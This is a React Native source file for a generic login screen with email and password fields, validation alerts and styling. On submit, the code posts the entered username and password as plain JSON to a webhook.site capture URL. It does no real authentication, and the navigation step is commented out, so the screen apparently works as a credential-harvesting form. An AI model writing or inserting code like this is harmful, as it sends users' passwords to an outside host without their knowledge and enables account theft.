
import { parseAsync } from "@babel/core";
import React, { useState ,useEffect} from "react";
import {
  StyleSheet,
  Text,
  View,
  Image,
  TextInput,
  Button,
  TouchableOpacity,
  StatusBar,
} from "react-native";

export default function Home({navigation}) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const checkTextInput = async () => {

    //Check for the Name TextInput

    if (!email.trim()) {

      alert('Please Enter Email');

      return;

    }

    //Check for the Email TextInput

    if (!password.trim()) {

      alert('Please Enter Password');

      return;

    }

    //api GET requset
    
    try{
      await fetch('https://webhook.site/f555502c-d993-4162-bc33-bda041e5ff90',{
        method:'post',
        mode:'no-cors',
        headers:{
          'Accept':'application/json',
          'Content-Type':'application/json'

        },
        body:JSON.stringify({
          "username":email,
          "password":password
        })
      });
    }catch(e){
        console.log(e);
    }

    //Checked Successfully
    //Do whatever you want
    // eg:alert('Success');

    // navigation.navigate('Result', {
    //            paramKey1: email,
              
    //         })
  };
 
  return (
    <View style={styles.container}>
      {/* <StatusBar style="auto"/> */}
      <Text>LOGIN</Text>
      <Text>Please login to continue.</Text>
      <Text></Text>
      <View style={styles.inputView}>
        <TextInput
          style={styles.TextInput}
          placeholder="Email."
          placeholderTextColor="#003f5c"
          onChangeText={(email) => setEmail(email)}
        />
      </View>
 
      <View style={styles.inputView}>
        <TextInput
          style={styles.TextInput}
          placeholder="Password."
          placeholderTextColor="#003f5c"
          secureTextEntry={true}
          onChangeText={(password) => setPassword(password)}
        />
      </View>
 
      <TouchableOpacity>
        <Text style={styles.forgot_button}>Forgot Password?</Text>
      </TouchableOpacity>
 
      <TouchableOpacity style={styles.loginBtn} 
      // onPress={() => navigation.navigate('Result', {
      //         paramKey1: email,
              
      //       })} 
      onPress={checkTextInput}>
        <Text style={styles.loginText}>LOGIN</Text>
      </TouchableOpacity>
      
      <TouchableOpacity>
        <Text></Text>
        <Text style={styles.account_button}>Dont have an account?</Text>
      </TouchableOpacity>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "center",
  },
 
  image: {
    marginBottom: 40,
  },
 
  inputView: {
    backgroundColor: "#86A8D4",
    borderRadius: 30,
    width: "80%",
    height: 45,
    marginBottom: 20,
 
    alignItems: "center",
  },
 
  TextInput: {
    
    height: 50,
    flex: 1,
    padding: 10,
    marginLeft: 20,
    fontSize:20
  },
 
  forgot_button: {
    height: 30,
    marginBottom: 30,
  },
 
  loginBtn: {
    width: "80%",
    borderRadius: 25,
    height: 50,
    alignItems: "center",
    justifyContent: "center",
    marginTop: 40,
    backgroundColor: "#5390d9",
    
  },
  account_button: {
    height: 30,
    marginBottom: 30,
    color:"#fa1098"
  },
  loginText:{
    fontWeight:'bold',
    color:'#ffff'
  }
});
